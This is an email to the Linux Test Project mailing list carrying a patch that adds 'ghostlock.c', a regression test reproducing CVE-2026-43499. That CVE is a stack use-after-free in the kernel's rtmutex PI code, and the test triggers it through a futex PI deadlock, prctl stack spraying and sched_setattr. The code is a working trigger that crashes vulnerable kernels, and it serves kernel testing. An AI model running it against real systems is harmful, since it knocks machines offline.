Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 76896C624D4
	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 07:27:39 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id A55CE3E97C0
	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 09:27:37 +0200 (CEST)
Received: from in-6.smtp.seeweb.it (in-6.smtp.seeweb.it [217.194.8.6])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1) server-digest SHA384)
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id CFFA33E938F
 for <ltp@lists.linux.it>; Thu,  3 Sep 2026 09:26:47 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-6.smtp.seeweb.it (Postfix) with ESMTPS id 07434140044B
 for <ltp@lists.linux.it>; Thu,  3 Sep 2026 09:26:46 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id 1EBC321D90;
 Thu,  3 Sep 2026 07:26:38 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1788420402; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=brqYJcOo/nnKUFIUyarUgDcfd8id/2VehRFmH2y2Ikg=;
 b=RsMt6lm0RR/0DlznpEPMpv47BwqZ37kuXT5UoSW6AK3dXB0Ayn36+YR8hcMDPIBUpUvHbW
 4QFeS03ubh5fYgWXDgIocqntooIWjWtkhyuwKIskv609bJvQtrqfgGxedXNnhUEsS2/Ai8
 QmIJEk121xD4fzM2tAGDCs9ITJfOVrk=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1788420402;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=brqYJcOo/nnKUFIUyarUgDcfd8id/2VehRFmH2y2Ikg=;
 b=5WJji/q105CHbLex2oN8cilEZO08gPvKYU2W4RLRhTHh0reqqPM1KaBkkQMG/kQy7+qBsW
 vuZ6QhvQAGoKBGCw==
Authentication-Results: smtp-out1.suse.de;
 dkim=pass header.d=suse.de header.s=susede2_rsa header.b=zFiizvep;
 dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=dUn9dG8V
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1788420398; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=brqYJcOo/nnKUFIUyarUgDcfd8id/2VehRFmH2y2Ikg=;
 b=zFiizvepD6pgVcyeEoI9TLGgi2/XhckUa1csKjTAqBUEH7Qg41Emp5R9NANz463DK/4Fu/
 5mMz3VnhGgB4jD+IcscoXszljgC4DiZMUuEH32VW3K+JWOACrR+67Iy084qGafH0IciR+c
 zWa28Wm+6PpCMPe/VmQ6wpvFt05nB8w=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1788420398;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=brqYJcOo/nnKUFIUyarUgDcfd8id/2VehRFmH2y2Ikg=;
 b=dUn9dG8VL0+9AYVbro07bHsSO0elZIIivIHKxH+wK1jUYj/jU572mH7/iSxYQ6goFLNy3x
 +Ht/l56c4GfQiTBQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id D370913869;
 Thu,  3 Sep 2026 07:26:37 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id 4F7MMC0hmWqGaAAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Thu, 03 Sep 2026 07:26:37 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Thu, 03 Sep 2026 09:26:37 +0200
MIME-Version: 1.0
Message-Id: <20260903-cve-ghostlock-v6-3-a3272bb81e4d@suse.com>
References: <20260903-cve-ghostlock-v6-0-a3272bb81e4d@suse.com>
In-Reply-To: <20260903-cve-ghostlock-v6-0-a3272bb81e4d@suse.com>
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.16.0
X-Developer-Signature: v=1; a=ed25519-sha256; t=1788420397; l=9217;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=i816JN8DgGEoiiBEBN56ANiOsuzrgGwSZMSy6SN0+/s=;
 b=0J4cXKN/D2hB7L1l4l5+z2Q1QPEPG4+DupTXntNfYp1e7+3QS06lR7qdT2ZLTcXWOZ1+wO9Wy
 PN+0OKIJvS5DwiLPQy3DaONkNkmsnsuwjRqdIMfYV/zdUUorUfyKT8V
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Rspamd-Queue-Id: 1EBC321D90
X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[];
 DNSWL_BLOCKED(0.00)[2a07:de40:b281:106:10:150:64:167:received];
 ARC_NA(0.00)[]; MIME_TRACE(0.00)[0:+];
 RCVD_VIA_SMTP_AUTH(0.00)[];
 SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 TO_DN_ALL(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
 FROM_HAS_DN(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 RCVD_COUNT_TWO(0.00)[2]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:mid,suse.com:email,nebusec.ai:url,nebusec.ai:email,imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,suse.de:dkim];
 DKIM_TRACE(0.00)[suse.de:+]
X-Virus-Scanned: clamav-milter 1.0.9 at in-6.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v6 3/3] cve: add CVE-2026-43499 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Add "Ghostlock" reproducer for CVE-2026-43499.

Reproducer based on the Nebula Security writeup and open-sourced PoC
(https://nebusec.ai/research/ionstack-part-2/,
https://github.com/NebuSec/CyberMeowfia).

Beware, this test will crash the system on a vulnerable kernel.

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve               |   1 +
 testcases/cve/.gitignore  |   1 +
 testcases/cve/Makefile    |   2 +-
 testcases/cve/ghostlock.c | 246 ++++++++++++++++++++++++++++++++++++++++++++++
 4 files changed, 249 insertions(+), 1 deletion(-)

diff --git a/runtest/cve b/runtest/cve
index b096bacef..894863e33 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -88,6 +88,7 @@ cve-2023-1829 tcindex01
 cve-2023-0461 setsockopt10
 cve-2023-31248 nft02
 cve-2023-52879 fanotify25
+cve-2026-43499 ghostlock
 cve-2026-53362 setsockopt11
 cve-2026-64600 refluxfs
 # Tests below may cause kernel memory leak
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index a167a8743..418d67566 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -16,5 +16,6 @@ tcindex01
 cve-2025-38236
 cve-2025-21756
 cve-2026-46331
+ghostlock
 refluxfs
 sctphantom
diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
index 6be4999a3..b4e4178eb 100644
--- a/testcases/cve/Makefile
+++ b/testcases/cve/Makefile
@@ -11,7 +11,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
 
 cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
 
-cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 ghostlock refluxfs:  CFLAGS += -pthread
 cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
 
 ifneq ($(ANDROID),1)
diff --git a/testcases/cve/ghostlock.c b/testcases/cve/ghostlock.c
new file mode 100644
index 000000000..0e6becc26
--- /dev/null
+++ b/testcases/cve/ghostlock.c
@@ -0,0 +1,246 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
+ * Copyright (c) 2026 Linux Test Project
+ */
+
+/*\
+ * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
+ * rtmutex PI code, fixed in kernel v7.1:
+ * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in remove_waiter()")
+ *
+ * Reproducer based on the Nebula Security writeup and open-sourced PoC
+ * (https://nebusec.ai/research/ionstack-part-2/ and
+ * https://github.com/NebuSec/CyberMeowfia).
+ * Beware, this test will crash the system on a vulnerable kernel.
+ *
+ * [Algorithm]
+ *
+ * - Set up a three-futex PI deadlock topology.
+ * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
+ * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
+ *   pi_blocked_on pointer dangling on its own stack.
+ * - Waiter sprays its stack continuously via :manpage:`prctl(2)` (PR_SET_MM_MAP)
+ *   with non-canonical addresses while main thread calls :manpage:`sched_setattr(2)`
+ *   on the waiter to trigger a chain walk.
+ * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
+ *   kernel.
+ */
+
+#include "tst_test.h"
+#include "tst_timer.h"
+#include "tst_safe_clocks.h"
+#include "tst_safe_pthread.h"
+#include "lapi/syscalls.h"
+#include "lapi/sched.h"
+#include "lapi/prctl.h"
+#include "lapi/futex.h"
+
+#define ATTEMPTS 128
+#define POISON_PTR 0xdeadbee11c518f58ULL
+#define MAX_AUXV_WORDS 48
+
+#define CP_CHAIN_HELD 0
+#define CP_TARGET_HELD 1
+#define CP_SPRAYED 2
+
+static uint32_t f_wait;
+static uint32_t f_pi_target;
+static uint32_t f_pi_chain;
+
+static pid_t waiter_tid;
+static pid_t owner_tid;
+
+static unsigned long auxv[MAX_AUXV_WORDS];
+static uint32_t valid_auxv_size;
+static tst_atomic_t stop_spray;
+
+static const int try_sizes[] = {
+	MAX_AUXV_WORDS,
+	MAX_AUXV_WORDS - 4,
+	MAX_AUXV_WORDS - 8
+};
+
+static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
+				 struct timespec *ts)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
+			   uaddr2, 0);
+}
+
+static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
+			   uaddr2, 0);
+}
+
+static int futex_lock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
+}
+
+static int futex_unlock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
+}
+
+static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	struct timespec ts;
+	struct prctl_mm_map mm_map = {
+		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
+		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
+		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
+		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
+		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
+		.brk         = (uint64_t)(uintptr_t)sbrk(0),
+		.start_stack = (uint64_t)(uintptr_t)&mm_map,
+		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
+		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
+		.env_start   = (uint64_t)(uintptr_t)&mm_map,
+		.env_end     = (uint64_t)(uintptr_t)&mm_map,
+		.auxv        = (void *)auxv,
+		.auxv_size   = valid_auxv_size,
+		.exe_fd      = (uint32_t)-1,
+	};
+
+	waiter_tid = tst_syscall(__NR_gettid);
+
+	futex_lock_pi(&f_pi_chain);
+
+	TST_CHECKPOINT_WAKE(CP_CHAIN_HELD);
+
+	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
+	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
+	if (futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts) != -1 ||
+	    (errno != ETIMEDOUT && errno != EWOULDBLOCK && errno != EDEADLK))
+		tst_brk(TBROK | TERRNO, "futex_wait_requeue_pi() failed unexpectedly");
+
+	TST_CHECKPOINT_WAKE(CP_SPRAYED);
+
+	while (!tst_atomic_load(&stop_spray)) {
+		/* This is the syscall that poison the buffer and it might
+		 * fail, so we don't use the SAFE_* variant.
+		 */
+		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
+		      sizeof(mm_map), 0);
+	}
+
+	futex_unlock_pi(&f_pi_chain);
+
+	return NULL;
+}
+
+static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	owner_tid = tst_syscall(__NR_gettid);
+
+	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+
+	futex_lock_pi(&f_pi_target);
+	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
+
+	futex_lock_pi(&f_pi_chain);
+
+	futex_unlock_pi(&f_pi_chain);
+	futex_unlock_pi(&f_pi_target);
+
+	return NULL;
+}
+
+static void setup(void)
+{
+	struct prctl_mm_map map = {
+		.exe_fd = (uint32_t)-1,
+		.auxv = (void *)auxv,
+	};
+	unsigned int i;
+
+	for (i = 0; i < MAX_AUXV_WORDS; i++)
+		auxv[i] = POISON_PTR + i * sizeof(unsigned long);
+
+	map.start_code = map.start_data = map.end_data =
+	map.start_brk = map.brk = map.start_stack = map.arg_start =
+	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&map;
+	map.end_code = map.start_code + 0x1000;
+
+	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
+		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
+		map.auxv_size = valid_auxv_size;
+
+		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
+			break;
+	}
+
+	if (i == ARRAY_SIZE(try_sizes))
+		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");
+
+	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
+}
+
+static void run(void)
+{
+	pthread_t waiter_th, owner_th;
+	struct sched_attr attr = {
+		.size = sizeof(attr),
+		.sched_policy = SCHED_BATCH,
+		.sched_nice = 19,
+	};
+	int i;
+
+	tst_res(TINFO, "Triggering PI deadlock and stack spray");
+
+	for (i = 0; i < ATTEMPTS; i++) {
+		if (!tst_remaining_runtime())
+			break;
+
+		f_wait = 0;
+		f_pi_target = 0;
+		f_pi_chain = 0;
+		tst_atomic_store(0, &stop_spray);
+
+		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
+		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);
+
+		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);
+
+		TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000);
+		TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000);
+
+		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
+		if (TST_RET != -1 || TST_ERR != EDEADLK)
+			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");
+
+		TST_CHECKPOINT_WAIT2(CP_SPRAYED, 18000);
+
+		SAFE_SCHED_SETATTR(waiter_tid, &attr, 0);
+
+		tst_atomic_store(1, &stop_spray);
+
+		SAFE_PTHREAD_JOIN(waiter_th, NULL);
+		SAFE_PTHREAD_JOIN(owner_th, NULL);
+	}
+
+	if (i < ATTEMPTS)
+		tst_res(TINFO, "Runtime exhausted, executed %d/%d attempts", i, ATTEMPTS);
+
+	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", i);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.test_all = run,
+	.runtime = 180,
+	.needs_checkpoints = 1,
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_CHECKPOINT_RESTORE=y",
+		"CONFIG_FUTEX_PI=y",
+		NULL
+	},
+	.taint_check = TST_TAINT_W | TST_TAINT_D,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "3bfdc63936dd"},
+		{"CVE", "2026-43499"},
+		{}
+	},
+};

-- 
2.51.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
